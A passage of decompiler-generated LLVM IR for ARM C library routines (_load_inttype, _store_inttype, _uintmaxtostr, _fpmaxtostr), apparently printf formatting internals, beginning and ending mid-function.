  %v3_1883c = inttoptr i32 %v2_1883c to i32*
  store i32 %v0_1883c, i32* %v3_1883c, align 4
  %v0_18840.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_18840

dec_label_pc_18840:                               ; preds = %dec_label_pc_187e4, %dec_label_pc_18824
  %v2_1884c = phi i32 [ %v0_187f4, %dec_label_pc_187e4 ], [ %v0_18840.pre, %dec_label_pc_18824 ]
  %v1_18840 = inttoptr i32 %v2_1884c to i16*
  %v2_18840 = load i16, i16* %v1_18840, align 2
  %v3_18840 = zext i16 %v2_18840 to i32
  %v1_18844 = or i16 %v2_18840, 64
  %v1_18848 = and i32 %v3_18840, 2816
  store i32 %v1_18848, i32* %r0.global-to-local, align 4
  %v2_18848 = icmp eq i32 %v1_18848, 0
  store i16 %v1_18844, i16* %v1_18840, align 2
  br i1 %v2_18848, label %bb10, label %.thread1

bb10:                                             ; preds = %dec_label_pc_18840
  %v1_18850 = load i32, i32* @r4, align 4
  %v2_18850 = add i32 %v1_18850, 12
  %v3_18850 = inttoptr i32 %v2_18850 to i32*
  %v4_18850 = load i32, i32* %v3_18850, align 4
  %v3_18854 = add i32 %v1_18850, 28
  %v4_18854 = inttoptr i32 %v3_18854 to i32*
  store i32 %v4_18850, i32* %v4_18854, align 4
  br label %bb11

.thread1:                                         ; preds = %dec_label_pc_18840
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb11

bb11:                                             ; preds = %bb10, %dec_label_pc_187d0, %.thread1
  %v2_1885c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1885c, i32* @r4, align 4
  %v1_18860 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_18860

; uselistorder directives
  uselistorder i32 %v2_18830, { 1, 0 }
  uselistorder i32 %v0_187f4, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v4_18798, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 4, 3, 5 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %bb11, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18840, { 1, 0 }
  uselistorder label %dec_label_pc_18824, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1880c, { 1, 0 }
  uselistorder label %dec_label_pc_187c4, { 1, 0 }
  uselistorder label %dec_label_pc_187b8, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %v0_18864 = load i32, i32* @r2, align 4
  %v1_18864 = icmp slt i32 %v0_18864, 0
  %v0_18868 = load i32, i32* @r0, align 4
  %v1_1886c = and i32 %v0_18868, 2048
  %v2_188a0 = icmp eq i32 %v1_1886c, 0
  br i1 %v1_18864, label %dec_label_pc_188a0, label %dec_label_pc_18874

dec_label_pc_18874:                               ; preds = %entry
  br i1 %v2_188a0, label %dec_label_pc_1887c, label %dec_label_pc_188a8

dec_label_pc_1887c:                               ; preds = %dec_label_pc_18874
  %v7_1887c = icmp eq i32 %v0_18868, 256
  %v0_18880 = load i32, i32* @r1, align 4
  %v1_18880 = inttoptr i32 %v0_18880 to i32*
  %v2_18880 = load i32, i32* %v1_18880, align 4
  %v2_18884 = urem i32 %v2_18880, 256
  %v2_18884.v2_18880 = select i1 %v7_1887c, i32 %v2_18884, i32 %v2_18880
  br i1 %v7_1887c, label %.thread, label %dec_label_pc_1888c

dec_label_pc_1888c:                               ; preds = %dec_label_pc_1887c
  %v7_1888c = icmp eq i32 %v0_18868, 512
  br i1 %v7_1888c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1888c
  %v4_18894 = urem i32 %v2_18884.v2_18880, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1888c, %dec_label_pc_1887c, %bb
  %v1_1889c = phi i32 [ %v2_18880, %dec_label_pc_1888c ], [ %v2_18884, %dec_label_pc_1887c ], [ %v4_18894, %bb ]
  store i32 0, i32* @r1, align 4
  ret i32 %v1_1889c

dec_label_pc_188a0:                               ; preds = %entry
  br i1 %v2_188a0, label %dec_label_pc_188b0, label %dec_label_pc_188a8

dec_label_pc_188a8:                               ; preds = %dec_label_pc_18874, %dec_label_pc_188a0
  %v0_188a8 = load i32, i32* @r1, align 4
  %v1_188a8 = inttoptr i32 %v0_188a8 to i32*
  %v2_188a8 = load i32, i32* %v1_188a8, align 4
  %v3_188a8 = add i32 %v0_188a8, 4
  %v4_188a8 = inttoptr i32 %v3_188a8 to i32*
  %v5_188a8 = load i32, i32* %v4_188a8, align 4
  store i32 %v5_188a8, i32* @r1, align 4
  ret i32 %v2_188a8

dec_label_pc_188b0:                               ; preds = %dec_label_pc_188a0
  %v7_188b0 = icmp eq i32 %v0_18868, 256
  %v0_188b4 = load i32, i32* @r1, align 4
  %v1_188b4 = inttoptr i32 %v0_188b4 to i32*
  %v2_188b4 = load i32, i32* %v1_188b4, align 4
  %v2_188b8 = urem i32 %v2_188b4, 256
  %v2_188b8.v2_188b4 = select i1 %v7_188b0, i32 %v2_188b8, i32 %v2_188b4
  br i1 %v7_188b0, label %.thread2, label %dec_label_pc_188c0

dec_label_pc_188c0:                               ; preds = %dec_label_pc_188b0
  %v7_188c0 = icmp eq i32 %v0_18868, 512
  br i1 %v7_188c0, label %bb5, label %.thread2

bb5:                                              ; preds = %dec_label_pc_188c0
  %v4_188c4 = mul i32 %v2_188b8.v2_188b4, 65536
  %v4_188c8 = sdiv i32 %v4_188c4, 65536
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_188c0, %dec_label_pc_188b0, %bb5
  %v0_188cc = phi i32 [ %v2_188b4, %dec_label_pc_188c0 ], [ %v2_188b8, %dec_label_pc_188b0 ], [ %v4_188c8, %bb5 ]
  %v3_188cc = ashr i32 %v0_188cc, 31
  store i32 %v3_188cc, i32* @r1, align 4
  ret i32 %v0_188cc

; uselistorder directives
  uselistorder i32 %v0_188cc, { 1, 0 }
  uselistorder i32 %v2_188b8, { 1, 0 }
  uselistorder i32 %v2_188b4, { 1, 2, 0 }
  uselistorder i32 %v2_18884, { 1, 0 }
  uselistorder i32 %v2_18880, { 1, 2, 0 }
  uselistorder i1 %v2_188a0, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_188a8, { 1, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @_store_inttype(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %tmp = trunc i32 %arg3 to i16
  %tmp2 = ptrtoint i16* %arg1 to i32
  %v7_188d4 = icmp eq i32 %arg2, 256
  store i1 %v7_188d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_188d4, label %bb, label %bb4

bb:                                               ; preds = %entry
  %v3_188d8 = trunc i32 %arg3 to i8
  %tmp3 = bitcast i16* %arg1 to i8*
  store i8 %v3_188d8, i8* %tmp3, align 1
  %v1_188dc.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v1_188dc = phi i1 [ false, %entry ], [ %v1_188dc.pre, %bb ]
  %v0_188dc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_188dc, i32 %v0_188dc)
  %v7_188e0 = icmp eq i32 %arg2, 2048
  store i1 %v7_188e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_188e0, label %dec_label_pc_188e8, label %dec_label_pc_188f0

dec_label_pc_188e8:                               ; preds = %bb4
  %tmp5 = bitcast i16* %arg1 to i32*
  store i32 %arg3, i32* %tmp5, align 4
  %v5_188e8 = add i32 %tmp2, 4
  %v6_188e8 = inttoptr i32 %v5_188e8 to i32*
  store i32 %arg4, i32* %v6_188e8, align 4
  ret i32 %tmp2

dec_label_pc_188f0:                               ; preds = %bb4
  %v7_188f0 = icmp eq i32 %arg2, 512
  store i1 %v7_188f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_188f0, label %bb6, label %.thread

bb6:                                              ; preds = %dec_label_pc_188f0
  store i16 %tmp, i16* %arg1, align 2
  br label %bb8

.thread:                                          ; preds = %dec_label_pc_188f0
  %tmp7 = bitcast i16* %arg1 to i32*
  store i32 %arg3, i32* %tmp7, align 4
  br label %bb8

bb8:                                              ; preds = %bb6, %.thread
  ret i32 %tmp2

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 1, 0, 2, 3, 4 }
  uselistorder label %bb8, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @_uintmaxtostr(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %tmp21 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp21, i32* %r7.global-to-local, align 4
  %v1_1890c = icmp slt i32 %tmp21, 0
  %v2_1890c = icmp eq i32 %tmp21, 0
  store i1 %v2_1890c, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r8.global-to-local, align 4
  %v0_18914 = load i32, i32* @r2, align 4
  store i32 %v0_18914, i32* %r5.global-to-local, align 4
  %v0_18918 = load i32, i32* @r3, align 4
  store i32 %v0_18918, i32* %r6.global-to-local, align 4
  br i1 %v1_1890c, label %dec_label_pc_18920, label %dec_label_pc_18940

dec_label_pc_18920:                               ; preds = %entry
  %v1_18920 = icmp slt i32 %v0_18918, 0
  %v2_18920 = icmp eq i32 %v0_18918, 0
  store i1 %v2_18920, i1* %cpsr_z.global-to-local, align 1
  %v1_18924 = sub i32 0, %tmp21
  store i32 %v1_18924, i32* %r7.global-to-local, align 4
  br i1 %v1_18920, label %dec_label_pc_1892c, label %dec_label_pc_18940

dec_label_pc_1892c:                               ; preds = %dec_label_pc_18920
  %v1_18930 = sub i32 0, %v0_18914
  store i32 %v1_18930, i32* %r5.global-to-local, align 4
  %v2_18930 = icmp eq i32 %v0_18914, 0
  %v2_18934 = icmp eq i1 %v2_18930, false
  %v5_18934 = sext i1 %v2_18934 to i32
  %v6_18934 = sub i32 %v5_18934, %v0_18918
  store i32 %v6_18934, i32* %r6.global-to-local, align 4
  %v19_18934 = icmp eq i32 %v6_18934, 0
  store i1 %v19_18934, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_18948

dec_label_pc_18940:                               ; preds = %dec_label_pc_18920, %entry
  br label %dec_label_pc_18948

dec_label_pc_18948:                               ; preds = %dec_label_pc_1892c, %dec_label_pc_18940
  %storemerge = phi i8 [ 0, %dec_label_pc_18940 ], [ 1, %dec_label_pc_1892c ]
  store i32 0, i32* %sl.global-to-local, align 4
  store i8 0, i8* %arg1, align 1
  %v0_18950 = load i32, i32* %r7.global-to-local, align 4
  %v2_18958 = udiv i32 -1, %v0_18950
  store i32 %v2_18958, i32* %fp.global-to-local, align 4
  %v3_18968 = urem i32 -1, %v0_18950
  %v1_1896c = add i32 %v3_18968, 1
  store i32 %v1_1896c, i32* %sb.global-to-local, align 4
  %v9_18970 = icmp eq i32 %v1_1896c, %v0_18950
  store i1 %v9_18970, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_18970, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_18948
  %v1_18974 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_18974, i32* %sb.global-to-local, align 4
  %v2_18978 = add i32 %v2_18958, 1
  store i32 %v2_18978, i32* %fp.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_18948, %bb
  %v0_1897c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1897c, i32* %sl.global-to-local, align 4
  %v0_18980 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_18980, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_18984

dec_label_pc_18984thread-pre-split:               ; preds = %bb25
  %v0_18984.pr = load i32, i32* %sl.global-to-local, align 4
  %v0_18988.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_1898c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_18984

dec_label_pc_18984:                               ; preds = %dec_label_pc_18984thread-pre-split, %.thread
  %v0_18a08 = phi i32 [ %v0_1898c.pre, %dec_label_pc_18984thread-pre-split ], [ %v0_18950, %.thread ]
  %v0_18a00 = phi i32 [ %v0_18988.pre, %dec_label_pc_18984thread-pre-split ], [ %v0_18980, %.thread ]
  %v0_1899c = phi i32 [ %v0_18984.pr, %dec_label_pc_18984thread-pre-split ], [ %v0_1897c, %.thread ]
  %v2_18984 = icmp eq i32 %v0_1899c, 0
  store i1 %v2_18984, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18984, label %dec_label_pc_189fc, label %dec_label_pc_18994

dec_label_pc_18994:                               ; preds = %dec_label_pc_18984
  %v2_18998 = udiv i32 %v0_1899c, %v0_18a08
  %v3_18998 = urem i32 %v0_1899c, %v0_18a08
  store i32 %v2_18998, i32* %sl.global-to-local, align 4
  %v2_189b8 = udiv i32 %v0_18a00, %v0_18a08
  %v3_189b8 = urem i32 %v0_18a00, %v0_18a08
  %v0_189bc = load i32, i32* %sb.global-to-local, align 4
  %v2_189bc = mul i32 %v0_189bc, %v3_18998
  %v2_189c4 = add i32 %v2_189bc, %v3_189b8
  store i32 %v2_189c4, i32* %r5.global-to-local, align 4
  %v0_189d0 = load i32, i32* %fp.global-to-local, align 4
  %v2_189d0 = mul i32 %v0_189d0, %v3_18998
  %v2_189d8 = add i32 %v2_189d0, %v2_189b8
  %v2_189e0 = udiv i32 %v2_189c4, %v0_18a08
  %v2_189e8 = add i32 %v2_189d8, %v2_189e0
  br label %dec_label_pc_18a14

dec_label_pc_189fc:                               ; preds = %dec_label_pc_18984
  %v2_189fc = udiv i32 %v0_18a00, %v0_18a08
  br label %dec_label_pc_18a14

dec_label_pc_18a14:                               ; preds = %dec_label_pc_18994, %dec_label_pc_189fc
  %storemerge28 = phi i32 [ %v2_189fc, %dec_label_pc_189fc ], [ %v2_189e8, %dec_label_pc_18994 ]
  %v0_18a30 = phi i32 [ %v2_189fc, %dec_label_pc_189fc ], [ %v2_189e8, %dec_label_pc_18994 ]
  %v1_18a30 = phi i32 [ 0, %dec_label_pc_189fc ], [ %v2_18998, %dec_label_pc_18994 ]
  %v2_189c4.pn = phi i32 [ %v0_18a00, %dec_label_pc_189fc ], [ %v2_189c4, %dec_label_pc_18994 ]
  store i32 %storemerge28, i32* %r6.global-to-local, align 4
  %v0_18a1c = urem i32 %v2_189c4.pn, %v0_18a08
  %v2_18a18 = icmp ugt i32 %v0_18a1c, 8
  %v7_18a18 = icmp eq i32 %v0_18a1c, 9
  store i1 %v7_18a18, i1* %cpsr_z.global-to-local, align 1
  %v1_18a20 = add i32 %v0_18a1c, 48
  %v0_18a28 = load i32, i32* %r8.global-to-local, align 4
  %v1_18a28 = add i32 %v0_18a28, -1
  store i32 %v1_18a28, i32* %r8.global-to-local, align 4
  %v2_18a2c = xor i1 %v7_18a18, true
  %v3_18a2c = and i1 %v2_18a18, %v2_18a2c
  %extract.t = trunc i32 %v1_18a20 to i8
  br i1 %v3_18a2c, label %bb24, label %bb25

bb24:                                             ; preds = %dec_label_pc_18a14
  %v2_18a1c = add i32 %v0_18a1c, %tmp11
  %extract.t9 = trunc i32 %v2_18a1c to i8
  br label %bb25

bb25:                                             ; preds = %dec_label_pc_18a14, %bb24
  %v0_18a34.off0 = phi i8 [ %extract.t, %dec_label_pc_18a14 ], [ %extract.t9, %bb24 ]
  %v2_18a30 = or i32 %v0_18a30, %v1_18a30
  %v4_18a30 = icmp eq i32 %v2_18a30, 0
  store i1 %v4_18a30, i1* %cpsr_z.global-to-local, align 1
  %v3_18a34 = inttoptr i32 %v1_18a28 to i8*
  store i8 %v0_18a34.off0, i8* %v3_18a34, align 1
  %v0_18a38 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18a38, label %dec_label_pc_18a3c, label %dec_label_pc_18984thread-pre-split

dec_label_pc_18a3c:                               ; preds = %bb25
  %v4_18a3c10 = zext i8 %storemerge to i32
  store i32 %v4_18a3c10, i32* @r3, align 4
  %v2_18a40 = icmp eq i8 %storemerge, 0
  store i1 %v2_18a40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18a40, label %dec_label_pc_18a3c..thread2_crit_edge, label %bb26

dec_label_pc_18a3c..thread2_crit_edge:            ; preds = %dec_label_pc_18a3c
  %v0_18a4c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %.thread2

bb26:                                             ; preds = %dec_label_pc_18a3c
  store i32 45, i32* @r3, align 4
  %v3_18a48 = load i32, i32* %r8.global-to-local, align 4
  %v4_18a48 = add i32 %v3_18a48, -1
  %v5_18a48 = inttoptr i32 %v4_18a48 to i8*
  store i8 45, i8* %v5_18a48, align 1
  %v6_18a48 = load i32, i32* %r8.global-to-local, align 4
  %v7_18a48 = add i32 %v6_18a48, -1
  store i32 %v7_18a48, i32* %r8.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_18a3c..thread2_crit_edge, %bb26
  %v0_18a4c = phi i32 [ %v0_18a4c.pre, %dec_label_pc_18a3c..thread2_crit_edge ], [ %v7_18a48, %bb26 ]
  ret i32 %v0_18a4c

; uselistorder directives
  uselistorder i32 %v0_18a1c, { 3, 2, 1, 0 }
  uselistorder i32 %v0_18a08, { 0, 6, 1, 2, 3, 5, 4 }
  uselistorder i8 %storemerge, { 1, 0 }
  uselistorder i32 %v0_18914, { 1, 0, 2 }
  uselistorder i32 %tmp21, { 0, 3, 2, 1 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %r7.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i8 1, { 4, 1, 5, 0, 7, 8, 2, 3, 9, 6, 10, 11 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %dec_label_pc_18a14, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_18948, { 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, double %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %tmp = fptrunc double %arg2 to float
  %tmp160 = bitcast float %tmp to i32
  store i32 %tmp160, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_0, align 4
  %stack_var_-46 = alloca i8, align 1
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-47 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-82 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-83 = alloca i32, align 4
  %stack_var_-81 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %v27_18a5c = load i32, i32* @lr, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v1_18a68 = add i32 %arg4, 8
  %v2_18a68 = inttoptr i32 %v1_18a68 to i8*
  %v3_18a68 = load i8, i8* %v2_18a68, align 1
  %v4_18a68 = zext i8 %v3_18a68 to i32
  store i32 %v4_18a68, i32* %sb.global-to-local, align 4
  %v1_18a6c = or i32 %v4_18a68, 32
  %v7_18a70 = icmp eq i32 %v1_18a6c, 97
  store i1 %v7_18a70, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg4, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v1_18a88 = inttoptr i32 %arg4 to i32*
  %v2_18a88 = load i32, i32* %v1_18a88, align 4
  store i32 %v2_18a88, i32* %fp.global-to-local, align 4
  store i32 %arg4, i32* %lr.global-to-local, align 4
  %v0_18a90 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_18a90, i32* %r6.global-to-local, align 4
  store i32 62804, i32* %ip.global-to-local, align 4
  br i1 %v7_18a70, label %bb, label %bb201

bb:                                               ; preds = %entry
  %v2_18a98 = add nuw nsw i32 %v4_18a68, 6
  store i32 %v2_18a98, i32* %r3.global-to-local, align 4
  br label %bb201

bb201:                                            ; preds = %entry, %bb
  %v1_18aa8 = phi i32 [ %v0_18a90, %entry ], [ %v2_18a98, %bb ]
  store i32 %tmp160, i32* %r5.global-to-local, align 4
  %v1_18aa0 = add i32 %arg4, 12
  %v2_18aa0 = inttoptr i32 %v1_18aa0 to i32*
  %v3_18aa0 = load i32, i32* %v2_18aa0, align 4
  store i32 %v3_18aa0, i32* %r2.global-to-local, align 4
  %v1_18aa4 = add i32 %arg4, 4
  %v2_18aa4 = inttoptr i32 %v1_18aa4 to i32*
  %v3_18aa4 = load i32, i32* %v2_18aa4, align 4
  store i32 %v3_18aa4, i32* @lr, align 4
  br i1 %v7_18a70, label %bb202, label %bb203

bb202:                                            ; preds = %bb201
  %v2_18aa8 = urem i32 %v1_18aa8, 256
  store i32 %v2_18aa8, i32* %sb.global-to-local, align 4
  br label %bb203

bb203:                                            ; preds = %bb201, %bb202
  %v1_18aac = icmp slt i32 %v2_18a88, 0
  %v2_18aac = icmp eq i32 %v2_18a88, 0
  store i1 %v2_18aac, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* %ip.global-to-local, align 4
  br i1 %v1_18aac, label %bb204, label %bb205

bb204:                                            ; preds = %bb203
  store i32 6, i32* %fp.global-to-local, align 4
  br label %bb205

bb205:                                            ; preds = %bb203, %bb204
  %v1_18abc = and i32 %v3_18aa0, 2
  %v2_18abc = icmp eq i32 %v1_18abc, 0
  store i1 %v2_18abc, i1* %cpsr_z.global-to-local, align 1
  store i8 0, i8* %stack_var_-46, align 1
  br i1 %v2_18abc, label %dec_label_pc_18ad4, label %dec_label_pc_18ae0

dec_label_pc_18ad4:                               ; preds = %bb205
  %v1_18ad4 = urem i32 %v3_18aa0, 2
  %v2_18ad4 = icmp eq i32 %v1_18ad4, 0
  store i1 %v2_18ad4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18ad4, label %dec_label_pc_18ae4, label %dec_label_pc_18ae0

dec_label_pc_18ae0:                               ; preds = %dec_label_pc_18ad4, %bb205
  %storemerge = phi i32 [ 43, %bb205 ], [ 32, %dec_label_pc_18ad4 ]
  %v0_18ae0.off0 = phi i8 [ 43, %bb205 ], [ 32, %dec_label_pc_18ad4 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i8 %v0_18ae0.off0, i8* %stack_var_-46, align 1
  br label %dec_label_pc_18ae4

dec_label_pc_18ae4:                               ; preds = %dec_label_pc_18ad4, %dec_label_pc_18ae0
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v0_18a90, i32* %r3.global-to-local, align 4
  store i32 %tmp160, i32* @r0, align 4
  store i32 %v0_18a90, i32* %r1.global-to-local, align 4
  store i32 %tmp160, i32* @r2, align 4
  %v1_18b00 = fptrunc double %arg2 to float
  %v2_18b00 = bitcast float %v1_18b00 to i32
  %v9_18b00 = call i32 @__aeabi_dcmpeq(i32 %v2_18b00, i32 %v0_18a90, i32 %v2_18b00, i32 %v0_18a90, i32 0)
  store i32 %v9_18b00, i32* %r0.global-to-local, align 4
  %v2_18b04 = icmp eq i32 %v9_18b00, 0
  store i1 %v2_18b04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18b04, label %bb207, label %dec_label_pc_18b14

bb207:                                            ; preds = %dec_label_pc_18ae4
  store i32 8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_18bc8

dec_label_pc_18b14:                               ; preds = %dec_label_pc_18ae4
  %v0_18b14 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_18b14, i32* @r0, align 4
  %v0_18b18 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_18b18, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_18b24 = call i32 @__aeabi_dcmpeq(i32 %v0_18b14, i32 %v0_18b18, i32 0, i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_18b24, i32* %r0.global-to-local, align 4
  %v2_18b28 = icmp eq i32 %v7_18b24, 0
  store i1 %v2_18b28, i1* %cpsr_z.global-to-local, align 1
  %v0_18b70 = load i32, i32* %r5.global-to-local, align 4
  %v1_18b70 = sext i32 %v0_18b70 to i64
  %v2_18b70 = bitcast i64 %v1_18b70 to double
  br i1 %v2_18b28, label %dec_label_pc_18b70, label %dec_label_pc_18b30

dec_label_pc_18b30:                               ; preds = %dec_label_pc_18b14
  store i32 1072693248, i32* %r1.global-to-local, align 4
  %v9_18b40 = fdiv double 0.000000e+00, %v2_18b70
  %v10_18b40 = fptrunc double %v9_18b40 to float
  %v11_18b40 = bitcast float %v10_18b40 to i32
  store i32 %v11_18b40, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_18b4c = call i32 @__aeabi_dcmplt(i32 %v11_18b40, i32 1072693248, i32 0, i32 0)
  store i32 %v4_18b4c, i32* %r0.global-to-local, align 4
  %v2_18b50 = icmp eq i32 %v4_18b4c, 0
  store i1 %v2_18b50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18b50, label %bb208, label %dec_label_pc_18b5c

bb208:                                            ; preds = %dec_label_pc_18b30
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18d3c

dec_label_pc_18b5c:                               ; preds = %dec_label_pc_18b30
  store i32 45, i32* %r3.global-to-local, align 4
  store i8 45, i8* %stack_var_-46, align 1
  br label %dec_label_pc_18d3c

dec_label_pc_18b70:                               ; preds = %dec_label_pc_18b14
  store i32 %v0_18b70, i32* @r0, align 4
  %v0_18b74 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_18b74, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_18b80 = fptrunc double %v2_18b70 to float
  %v2_18b80 = bitcast float %v1_18b80 to i32
  %v6_18b80 = call i32 @__aeabi_dcmplt(i32 %v2_18b80, i32 %v0_18b74, i32 0, i32 0)
  store i32 %v6_18b80, i32* %r0.global-to-local, align 4
  %v2_18b84 = icmp eq i32 %v6_18b80, 0
  store i1 %v2_18b84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18b84, label %dec_label_pc_18b70..thread9_crit_edge, label %bb209

dec_label_pc_18b70..thread9_crit_edge:            ; preds = %dec_label_pc_18b70
  %v0_18ba4.pre = load i32, i32* %r6.global-to-local, align 4
  br label %.thread9

bb209:                                            ; preds = %dec_label_pc_18b70
  store i32 45, i32* %r2.global-to-local, align 4
  %v1_18b8c = load i32, i32* %r6.global-to-local, align 4
  %v2_18b8c = sub i32 0, %v1_18b8c
  store i32 %v2_18b8c, i32* %r4.global-to-local, align 4
  store i8 45, i8* %stack_var_-46, align 1
  store i32 %v2_18b8c, i32* %r6.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_18b70..thread9_crit_edge, %bb209
  %v0_18ba4 = phi i32 [ %v0_18ba4.pre, %dec_label_pc_18b70..thread9_crit_edge ], [ %v2_18b8c, %bb209 ]
  %v0_18ba0 = load i32, i32* %r5.global-to-local, align 4
  %v1_18ba0 = sext i32 %v0_18ba0 to i64
  %v2_18ba0 = bitcast i64 %v1_18ba0 to double
  %v9_18ba8 = fmul double %v2_18ba0, 0.000000e+00
  %v10_18ba8 = fptrunc double %v9_18ba8 to float
  %v11_18ba8 = bitcast float %v10_18ba8 to i32
  store i32 %v11_18ba8, i32* @r2, align 4
  store i32 %v0_18ba4, i32* %r3.global-to-local, align 4
  store i32 %v0_18ba0, i32* @r0, align 4
  store i32 %v0_18ba4, i32* %r1.global-to-local, align 4
  %v7_18bbc = call i32 @__aeabi_dcmpeq(i32 %v0_18ba0, i32 %v0_18ba4, i32 %v11_18ba8, i32 %v0_18ba4, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_18bbc, i32* %r0.global-to-local, align 4
  %v2_18bc0 = icmp eq i32 %v7_18bbc, 0
